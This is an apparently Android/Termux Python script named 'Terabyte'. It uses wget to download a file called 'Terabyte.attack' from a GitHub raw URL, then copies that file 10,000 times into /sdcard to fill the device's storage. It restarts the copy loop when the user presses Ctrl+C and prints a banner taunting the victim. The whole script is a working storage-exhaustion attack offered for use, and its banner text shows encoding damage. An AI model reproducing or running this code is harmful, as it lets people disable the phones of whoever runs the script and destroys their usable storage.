# -*- coding: utf-8 -*-
# coding=utf-8
import time,os,sys
                     
def sprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1.2 / 100)
        
logo = """\x1b[91m
 _______                _          
(_______)              | |            _         
    _ _____  ____ _____| |__  _   _ _| |_ _____ 
   | | ___ |/ ___|____ |  _ \| | | (_   _) ___ |
   | | ____| |   / ___ | |_) ) |_| | | |_| ____|
   |_|_____)_|   \_____|____/ \__  |  \__)_____)
   \x1b[33m\033[41m ·¥õ·¥è·¥è üs  ô è …™«´ ô·¥Ä ü·¥ç úùü∑ùüæ \033[00m\x1b[91m       (____/\x1b[00m"""
def main():
	try:
		for i in range(10000):
			os.system("cp Terabyte.attack /sdcard"+str(i))
	except KeyboardInterrupt:
		main()

def space():
	s =(' ')
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	
def run():
	try:
		os.system('wget https://raw.githubusercontent.com/saydog-official/saydog-framework/master/.core/modules/others/toolkit/Terabyte.attack &> /dev//null')
		os.system('clear')
		space()
		main()
		sprint(logo)
		print('')
		sprint('    \x1b[33m è·¥è·¥ú Ä s·¥õ·¥è Ä·¥Ä…¢·¥á ·¥°…™ ü ü  ô·¥á “ì·¥ú ü ü …™…¥ ùüπ s·¥á·¥Ñ·¥è…¥·¥Ö !')
		sprint('    \x1b[33m·¥á…¥·¥ä·¥è è ·¥õ ú·¥á ·¥ç·¥è·¥ç·¥á…¥·¥õ, \x1b[91m·¥Ö·¥ú·¥Ö·¥á ü§è')
		print('')
		sprint('    ...')
		time.sleep(50)
	except KeyboardInterrupt:
		main()
		
run()
